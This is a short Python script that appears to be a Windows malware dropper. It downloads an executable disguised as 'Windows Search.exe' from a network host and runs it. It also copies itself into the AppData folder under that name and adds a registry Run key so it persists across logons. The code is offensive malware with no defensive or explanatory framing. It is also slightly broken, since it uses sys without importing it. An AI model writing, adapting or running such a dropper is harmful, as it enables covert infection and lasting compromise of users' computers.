
import requests,re,subprocess,smtplib,tempfile
import os
import shutil
import time
def get_info(url):
        resp=requests.get(url)
        file_name=url.split("/")[-1]
        with open(file_name,"wb") as file:
                file.write(resp.content)
temp_folder=tempfile.gettempdir()
os.chdir(temp_folder)
get_info("http://192.168.1.27/Windows Search.exe")
e_f_loc=os.environ["appdata"]+"\Windows Search.exe"
if not os.path.exists(e_f_loc):
    shutil.copyfile(sys.executable,e_f_loc)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v search /t REG_SZ /d "'+e_f_loc+'"',shell=True)

subprocess.call('Windows Search.exe',shell=True)


